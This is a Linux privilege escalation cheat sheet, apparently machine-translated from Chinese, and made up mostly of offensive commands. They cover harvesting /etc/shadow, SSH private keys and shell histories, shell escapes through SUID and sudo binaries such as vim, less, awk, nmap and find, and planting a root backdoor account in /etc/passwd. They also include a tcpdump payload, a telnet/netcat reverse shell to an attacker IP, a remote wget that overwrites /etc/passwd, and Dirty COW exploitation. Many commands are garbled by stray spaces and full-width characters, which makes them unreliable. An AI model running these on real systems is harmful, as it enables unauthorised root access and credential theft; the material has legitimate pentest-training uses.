---
title: Linux Privilege Escalation Summary
---

# Linux Privilege Escalation Summary

## Privilege Escalation Concepts

> There are two types of privilege escalation: horizontal and vertical. In horizontal escalation, you move from one user to another user. In that case both users are ordinary users; in vertical escalation, privileges are raised from a normal user to an administrator.

Users cannot access, read, write, or execute files they are not permitted to access. However, the superuser (`root`) can access every file on the system. To change important configuration or continue deeper attacks, we first need to obtain `root` access on any Linux-based system.

### Why Do We Need Privilege Escalation?

- Read or write sensitive files
- Maintain access more easily across reboots
- Install a persistent backdoor

### Techniques Used for Privilege Escalation

Assume we already have a shell on the remote system. Depending on how we broke in, we may not have `root` privileges. The techniques below can be used to obtain `root` access on the system.

- Kernel vulnerabilities
- Programs running as root
- Installed software
- Weak passwords, reused passwords, or plaintext passwords
- Internal services
- SUID misconfiguration
- Abuse of sudo rights
- Writable scripts invoked by root
- PATH misconfiguration
- Cron jobs
- Unmounted file systems

Before privilege escalation, we need to collect host information to determine a viable escalation path.

## Information Gathering Before Privilege Escalation

### Operating System

Distribution type and version

```bash
cat /etc/issue 
cat /etc/*-release  
cat /etc/lsb-release # Debian
cat /etc/redhat-release # Redhat
```

Kernel version, 32-bit or 64-bit

```
cat /proc/version
uname -a uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

View environment variables. Passwords or API keys may exist in environment variables.

```bash
cat /etc/profile 
cat /etc/bashrc
cat ~/.bash_profile  
cat ~/.bashrc  
cat ~/.bash_logout  
env set
```

Path (`PATH`). If any folder in this variable is writable, certain libraries or binaries can be hijacked.

```bash
文件：PATH 
echo $ PATH 
```

Check whether printers exist.

```bash
lpstat -a 
```

### Applications and Services

Which services are running?

Which service has which user privileges?

```bash
ps aux
ps -ef top
cat /etc/services
```

Which services are running as root? These potentially vulnerable services are worth checking carefully.

```bash
ps aux | grep root ps -ef | grep root
```

Which applications are installed? What versions are they? Are they currently running?

```bash
ls -alh /usr/bin/ 
ls -alh /sbin/ 
dpkg -l 
rpm -qa 
ls -alh /var/cache/apt/archivesO 
ls -alh /var/cache/yum/
```

Are service settings misconfigured? Are vulnerable plugins attached?

```bash
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

Which jobs are scheduled? (Scheduled tasks)

```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

Are there plaintext usernames and/or passwords?

- Check files used by web servers to connect to databases (`config.php` or similar files)
- Check the database for administrator passwords that may be reused
- Check for weak passwords

```bash
grep -i user [filename] 
grep -i pass [filename] 
grep -C 5 "password" [filename] 
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" # Joomla
```

### Communication and Networking

Which NICs does the system have? Is it connected to another network?

```bash
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

Review network configuration to learn about the network: DHCP server, DNS server, gateway?

```bash
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

Which other users and hosts are communicating with the system?

In this situation, a user may be running services that are only reachable from this host. We cannot connect to those services externally. They may be development servers, databases, or anything else. These services may be running as root, or vulnerabilities may exist in them.

```bash
# Linux 
netstat -anlp 
netstat -ano
```

```bash
lsof -i
lsof -i :80 grep 80 /etc/services
netstat -antup 
netstat -antpx
netstat -tulpn
chkconfig --list chkconfig --list | grep 3:on
last
w
```

IP and/or MAC address

```bash
arp -e
route
/sbin/route -nee
```

Is packet sniffing possible? What can be seen?

```bash
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
```

Note: `tcpdump tcp dst [ip] [port]` and `tcp dst [ip] [port]`

Do we have a shell?

```bash
nc -lvp 4444 # Attacker. Input (Commands)
nc -lvp 4445 # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets sys
```

Is port forwarding possible? Redirect traffic and interact with it.

Note: `FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]`

```bash
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
```

Note: `ssh-[L/R] [local port]:[remote IP]:[remote port] [local user]@[local IP]`

```bash
ssh -L 8080:127.0.0.1:80 root\@192.168.1.7 # Local Port
ssh -R 8080:127.0.0.1:80 root\@192.168.1.7 # Remote Port
```

Note: `mknod backpipe p; nc -l -p [remote port] backpipe`

```bash
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost
```

Can tunneling be used? Send commands locally or remotely.

```bash
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
```

### Secrets and Users

Who are you? Who is logged in? Who has logged in before? Who else is there? Who can do what?

```bash
id 
who 
w
last
cat /etc/passwd \| cut -d: -f1 \ # List of users
grep -v -E "^#" /etc/passwd |
cat /etc/sudoers
sudo -l
```

What sensitive files can be found?

```bash
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
```

Is there anything useful in the `home` or `root` directories, if accessible?

```bash
ls -ahlR /root/
ls -ahlR /home/
```

Are there passwords inside? Scripts, databases, configuration files, or log files? Default password paths and locations.

```bash
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
```

What are users doing? Are there plaintext passwords? What are they editing?

```bash
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
```

User information

```bash
cat ~/.bashrc cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
```

Private key information

```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

### File System

Which configuration files under `/etc/` are writable? Can services be reconfigured?

```bash
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null    # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null     # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null         # Other
find /etc/ -readable -type f 2>/dev/null             # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null # Anyone
```

What can be found under `/var/`?

```bash
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
```

Are there any hidden settings or files on the website? Are there any configuration files with database information?

```bash
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
```

Is there anything in the log files that can help with local file inclusion?

```bash
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/


Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, m
```

If commands are restricted, obtain an interactive shell.

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

Are there mounted file systems?

```bash
mount
df -h
```

Are there any unmounted file systems?

```bash
cat /etc/fstab
```

What are Linux file permissions?

```bash
find / -perm -1000 -type d 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null # SGID or SUID
```

Where can you write and execute? Some common locations: `/tmp`, `/var/tmp`, `/dev/shm`.

```bash
find  / -writable -type d 2>/dev/null     # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders
find / -perm -o x -type d 2>/dev/null     # world-executable folders
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null  # world-writeable
```

Any problematic files? World-writable files owned by `nobody`.

```bash
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
find /dir -xdev \( -nouser -o -nogroup \) -print
```

### Preparing and Finding Exploit Code

Which development tools or languages are installed or supported?

```bash
find / -name perl\*
find / -name python\*
find / -name gcc\* find / -name cc
```

How can files be uploaded?

```bash
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
```

Is the system fully patched?

```
内核，操作系统，所有应用程序，其插件和Web服务
```

## Automated Linux Privilege Escalation Information Gathering

### Enumeration Scripts

LinEnum

https://github.com/rebootuser/LinEnum

Unix Privilege Escalation

http://pentestmonkey.net/tools/audit/unix-privesc-check

Run the script and save the output to a file, then use `grep` to identify warnings.

Linprivchecker.py

https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py

By exploiting vulnerabilities in the Linux kernel, we can sometimes raise privileges. The operating system, architecture, and kernel version are usually the key details needed to test whether a kernel exploit is feasible.

## Kernel Vulnerabilities

A kernel exploit is a program that abuses a kernel vulnerability to execute arbitrary code with higher privileges. A successful kernel exploit usually gives the attacker superuser access to the target system in the form of a root command prompt. In many cases, escalating to root on a Linux system can be as simple as downloading the kernel exploit to the target file system, compiling it, and executing it.

Assuming we can run code as an unprivileged user, the general workflow for kernel exploitation is as follows.

```
诱使内核在内核模式下运行我们的有效负载

处理内核数据，例如进程特权

以新特权启动shell root！
```

For a kernel exploit to succeed, the attacker must satisfy the following four conditions:

```
易受攻击的内核

匹配的漏洞利用程序

将漏洞利用程序转移到目标上的能力

在目标上执行漏洞利用程序的能力
```

The easiest defense against kernel vulnerabilities is to keep the kernel patched and up to date. When patches are not available, administrators can greatly affect an attacker's ability to transfer and execute exploits on the target. If administrators can prevent exploits from being introduced to and/or executed on the Linux file system, kernel exploit attacks become infeasible. Therefore administrators should focus on restricting or removing file-transfer programs such as FTP, TFTP, SCP, wget, and curl. When these programs are required, their use should be limited to specific users, directories, applications such as SCP, and specific IP addresses or domains.

### Kernel Information Gathering

Some basic commands for collecting Linux kernel information.

```bash
uname -a #打印所有可用的系统信息
uname -m #Linux内核体系结构（32或64 位）
uname -r #内核发布
uname -n #要么 hostname 系统主机名
#内核信息
cat /proc/version
#发行信息
cat /etc/issue 
cat /etc/*-release
#CPU信息
cat /proc/cpuinfo 
#文件系统信息
df -a             
#列出可用的编译器
dpkg \--list 2>/dev/null\| grep compiler \|grep -v decompiler 2>/dev/null && yum list installed \'gcc\*\' 2>/dev/null\| grep gcc 2>/dev/null 
```

Search for vulnerabilities.

```bash
site:exploit-db.com kernel version python linprivchecker.py extended
```

### Exploiting a Vulnerable Machine with Dirty COW (CVE-2016-5195)

```bash
$ whoami
$ uname -a 
给我们我们知道容易受到dirtycow攻击的内核版本>下载dirtycow漏洞
https：//www.exploit-db.com/exploits/40839/
编译并执行。通过编辑/etc/passwd
它将" root"用户替换为新用户" rash"
#将当前登录用户更改为root用户的"rash"
$ su rash
```

### Other Kernel Privilege Escalation

[PoCs · dirtycow/dirtycow.github.io Wiki · GitHub](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)

Many different local privilege escalation exploits are publicly available for different kernels and operating systems. Whether a kernel exploit can be used to obtain root access on a Linux host depends on whether the kernel is vulnerable. Kali Linux includes a local copy of exploit-db, which makes searching for local root exploits easier. I do not recommend relying entirely on this database when searching for Linux kernel vulnerabilities.

Check the kernel version and whether vulnerabilities are available for privilege escalation. A good list of vulnerable kernels and some compiled exploits can be found here:

https://github.com/lucyoa/kernel-exploits and exploit-db exploits.

Other sites where compiled exploits can be found:

https://github.com/bwbwbwbw/linux-exploit-binaries

https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack 

You can also search directly in MSF.

### Special Reminder

Do not start by exploiting local privilege escalation vulnerabilities.

Avoid kernel exploits if possible. Using one may crash the machine or leave it unstable, so kernel exploits should be a last resort.

```
a.远程主机可能会崩溃，因为许多公开可用的根漏洞利用都不十分稳定。

b.您可能会成为root用户，然后使系统崩溃。

c.漏洞利用可能会留下痕迹/日志。
```

## Historical Vulnerability Privilege Escalation

### CVE-2016-5195 (Dirty COW)

Linux kernel \<= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 \> /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil

https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

## Exploiting Services Running as Root

> The well-known EternalBlue and SambaCry vulnerabilities exploited SMB services running as root. Because of this deadly combination, they were widely used to spread ransomware around the world. The technique here is simple: if a specific service runs as root and we can make that service execute commands, then commands execute as root. We can focus on checking whether web services, mail services, database services, and similar services run as root. Operations teams often run these services as root and overlook the security risks this creates. Some services may also run locally without being exposed publicly, but they can still be exploited.

```bash
#显示所有打开并正在监听的端口
netstat -antup
#列出哪些进程正在运行
ps aux
#列出以root身份运行的服务
ps -aux | grep root
```

## Weak NFS Permissions

If you have a low-privilege shell on a Linux server and discover an NFS share on the server, you may be able to use it for privilege escalation. Success depends on how it is configured.

**What is NFS?**

Network File System (NFS) is a client/server application that lets a computer user view, select, store, and update files on a remote computer as if they were on the user's own computer. NFS is one of several distributed file-system standards for network-attached storage.

NFS is an application based on UDP/IP. Its implementation mainly uses the Remote Procedure Call (RPC) mechanism, which provides remote file-access operations independent of machines, operating systems, and lower-level transport protocols. RPC uses XDR support. XDR is a machine-independent data description encoding protocol that encodes and decodes data transmitted over the network in a format independent of any machine architecture, supporting data transfer between heterogeneous systems.

**root_squash and no_root_squash**

The Root Squashing (`root_squash`) parameter prevents remote root users connected to an NFS volume from having root access. When a remote root user connects, they are mapped to the `nfsnobody` user, which has minimal local privileges. If the `no_root_squash` option is enabled, the remote user is granted root access to the connected system. System administrators should always use the `root_squash` parameter when configuring NFS drives.

Note: to exploit this, the `no_root_squash` option must be enabled.

### Exploiting NFS and Getting a Root Shell

[https://cloud.tencent.com/developer/article/1708369](https://cloud.tencent.com/developer/article/1708369)

## SUID and GUID Misconfiguration

Description

SUID stands for Set User ID. It is a Linux feature that allows users to execute a file with the permissions of a specified user. For example, the Linux `ping` command usually requires root privileges to open network sockets. By marking `ping` as SUID with owner root, it executes with root privileges whenever a low-privilege user runs it.

SUID (Set User ID) is a permission assigned to a file. It appears on the owner execute bit, and a file with this permission temporarily grants the caller the permissions of the file owner when executed.

When a binary with SUID permissions runs, it runs as another user and therefore has that user's privileges. That user may be root or another user. If a SUID program can spawn a shell or otherwise be abused, we can use it to escalate privileges.

The following are programs that can be used to spawn a shell:

```
nmap
vim
less
more
nano
cp
mv
find
```

**Finding SUID and GUID files**

```bash
#SUID
find / -perm -u=s -type f 2>/dev/null
#GUID
find / -perm -g=s -type f 2>/dev/null
```

**Other Commands**

```bash
#查找SUID文件
find / -perm -4000 -type f 2>/dev/null
#查找root拥有的SUID文件
find / -uid 0 -perm -4000 -type f 2>/dev/null
#查 找 SGID 文 件
find / -perm -2000 -type f 2>/dev/null
#查找可写文件，不包括proc 文件
find / ! -path "*/proc/*\" -perm -2 -type f -print 2>/dev/null
#查找rhost配置文件
find /home --name \*.rhosts -print 2>/dev/null
#查找hosts.equiv，列出权限并管理文件内容
find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null; -exec cat {} 2>/dev/null ; 
#显示当前用户历史记录
cat \~/.bash_history 
#向当前用户分发各种历史文件
ls -la \~/.\*\_history
#检查当前用户的ssh文件
ls -la \~/.ssh/
#在/etc中列出配置文件
find /etc -maxdepth 1 -name \'\*.conf\' -type f
ls -la /etc/\*.conf 
#显示可能有趣的打开文件
lsof \| grep \'/home/\|/etc/\|/opt/' 
也可以使用 sudo -l 命令列出当前用户可执行的命令
```

### Common Privilege Escalation Methods

**nmap**

```bash
#查找设置了SUID位的可执行文件
find / -perm -u = s -type f 2> / dev / null
```

```bash
#让我们确认nmap是否设置了SUID位。
ls -la / usr / local / bin / nmap
```

Nmap SUID placement: administrators often set the SUID bit on `nmap` so that it can scan networks effectively, because not all nmap scan techniques work unless it runs with root privileges.

However, nmap versions 2.02-5.21 have an interactive mode that can be abused for privilege escalation. In this mode, we can run nmap interactively and switch to a shell. If nmap has the SUID bit set, it runs with root privileges, and we can access a `root` shell through its interactive mode.

```bash
#运行nmap交互模式
nmap --interactive 
#我们可以从nmap shell转到系统shell
！sh
```

The module in MSF is:

```bash
exploit/unix/local/setuid_nmap
```



**vi/vim**

Vim is mainly used as a text editor. However, if it runs with SUID, it inherits root privileges and can therefore read every file on the system.

Open vim and press ESC.

```bash
:set shell=/bin/sh
:shell
```

Or:

```bash
sudo vim -c '!sh'
```

**bash**

The following command opens a bash shell as root.

```bash
bash -p
bash-3.2
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(servi
```

**less**

The `less` program can also execute a privileged shell. The same method applies to many other commands.

```bash
less /etc/passwd
!/bin/sh
```

**more**

```
more /home/pelle/myfile
!/bin/bash
```

**cp**

Overwrite `/etc/shadow` or `/etc/passwd`.

```bash
cat /etc/passwd >passwd
openssl passwd -1 -salt hack hack123
echo \'hack:\$1\$hack\$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash
cp passwd /etc/passwd
su - hack
id
```

**mv**

Overwrite `/etc/shadow` or `/etc/passwd`.

```bash
cat /etc/passwd \>passwd
openssl passwd -1 -salt hack hack123
echo \'hack:\$1\$hack\$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:
mv passwd /etc/passwd
su - hack
id
```

**nano**

```
nano /etc/passwd
```

**awk**

```
awk 'BEGIN {system("/bin/sh")}'
```

**man**

```
man passwd
!/bin/bash
```

**wget**

```
wget http://192.168.56.1:8080/passwd -O /etc/passwd
```

**apache**

Can only view files; cannot pop a shell.

```
apache2 -f /etc/shadow
```

**tcpdump**

```bash
echo \$\'id\ncat /etc/shadow' > /tmp/.test
chmod +x /tmp/.test
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

**python/perl/ruby/lua/php/etc**

python

```python
python -c "import os;os.system('/bin/bash')"
```

perl

```perl
exec "/bin/bash";
```

## Abusing SUDO

During penetration testing, the privileges of the webshell or reverse shell we obtain may be low. If we can use the `sudo` command to access certain programs, we can use sudo to escalate privileges.

```bash
/usr/bin/find
/usr/bin/nano
/usr/bin/vim
/usr/bin/man
/usr/bin/awk
/usr/bin/less
/usr/bin/nmap ( --interactive and --script method)
/bin/more
/usr/bin/wget
/usr/sbin/apache2
```

> `sudo` is a Linux system administration command. It allows system administrators to let ordinary users execute some or all root commands, such as `halt`, `reboot`, and `su`. This reduces root login and administration time and also improves security. `sudo` is not a replacement for the shell; it applies to each command.

```
a.sudo能够限制用户只在某台主机上运行某些命令。

b.sudo提供了丰富的日志，详细地记录了每个用户干了什么。它能够将日志传到中心主机或者日志服务器。

c.sudo使用时间戳文件来执行类似的"检票"系统。当用户调用sudo并且输入它的密码时，用户获得了一张存活期为5分钟的票（这个值可以在编译的时候改变）。

d.sudo的配置文件是sudoers文件，它允许系统管理员集中的管理用户的使用权限和使用的主机。它所存放的位置默认是在/etc/sudoers，属性必须为0440。
```

> Before `sudo` was written around 1980, ordinary users generally managed systems by using `su` to switch to the superuser. One drawback of `su` is that the superuser password must be disclosed first.
>
> `sudo` lets ordinary users obtain privileges without knowing the superuser password. First, the superuser records the ordinary user's name, the specific commands they may execute, and which user or group they may run them as in a special file, usually `/etc/sudoers`. This authorizes the user, who is then called a `sudoer`. When the ordinary user needs special privileges, they can add
>
> `sudo` before the command. `sudo` then asks for that user's own password to confirm that the user is at the terminal. After the password is accepted, the system runs the command process with superuser privileges. For a period of time afterward
>
> (five minutes by default, configurable in `/etc/sudoers`), sudo can be used without entering the password again.
>
> Because the superuser password is not required, some Unix systems even use `sudo` to let ordinary users replace the superuser as the administrative account, such as Ubuntu and Mac OS X.

Parameter description:

```
-V 显示版本编号

-h 会显示版本编号及指令的使用方式说明

-l 显示出自己（执行 sudo 的使用者）的权限

-v 因为 sudo 在第一次执行时或是在 N 分钟内没有执行（N 预设为五）会问密码，这个参数是重新做一次确认，如果超过 N 分钟，也会问密码

-k 将会强迫使用者在下一次执行 sudo 时问密码（不论有没有超过 N 分钟）

-b 将要执行的指令放在背景执行

-p prompt 可以更改问密码的提示语，其中 %u 会代换为使用者的帐号名称， %h 会显示主机名称

-u username/#uid 不加此参数，代表要以 root 的身份执行指令，而加了此参数，可以以 username 的身份执行指令（#uid 为该 username 的使用者号码）

-s 执行环境变数中的 SHELL 所指定的 shell ，或是 /etc/passwd 里所指定的 shell

-H 将环境变数中的 HOME （家目录）指定为要变更身份的使用者家目录（如不加 -u 参数就是系统管理者 root ）
command 要以系统管理者身份（或以 -u 更改为其他人）执行的指令
```

Sudoers file

The sudoers file mainly consists of three parts:

- sudoers default configuration (`default`), mainly setting sudo defaults
- aliases, mainly `Host_Alias` | `Runas_Alias` | `User_Alias` | `Cmnd_Alias`
- security policy (rule definitions)

Syntax

```text
root ALL=(ALL) ALL
```

The root user can execute commands from ALL terminals as ALL (any) users and run ALL (any) commands.

The first part is the user, the second part is the terminal where the user can use `sudo`, the third part is the user they can act as, and the last part is the commands they can run when using sudo.

```bash
touhid ALL= /sbin/poweroff
```

The command above allows the user to use touhid's user password from any terminal to run the shutdown command.

```bash
touhid ALL = (root) NOPASSWD: /usr/bin/find
```

The command above allows the user to run the `find` command as root from any terminal without a password.

### Exploiting SUDO Users

To exploit a sudo user, you need to find the commands you are allowed to run.

```
sudo -l
```

The command above shows the commands allowed for the current user.

**Using the find command**

```
sudo find / etc / passwd -exec / bin / sh \;
sudo find / bin -name nano -exec / bin / sh \;
```

**Using the Vim command**

```
sudo vim -c'！sh'
```

**Using the Nmap command**

```
sudo nmap-交互式
nmap>！sh
sh-4.1＃
```

**Latest method without interaction**

```bash
echo“ os.execute（'/ bin/ sh'）”> /tmp/shell.nse && sudo nmap --script = / tmp / shell.nse
```

**Using the man command**

```bash
sudo man man
```

Then press `!` and press Enter.

**Using the less/more command**

```bash
sudo less / etc / hosts
sudo more / etc / hosts
```

Then press `!` and press Enter.

**Using the awk command**

```
sudo awk'BEGIN {system（“ / bin / sh”）}'
```

## Docker Group Privilege Escalation

[http://www.openskill.cn/article/21](http://www.openskill.cn/article/21)

Due to time constraints, this summary is not very comprehensive. I will continue adding to it when I have time. Keep pushing forward together.
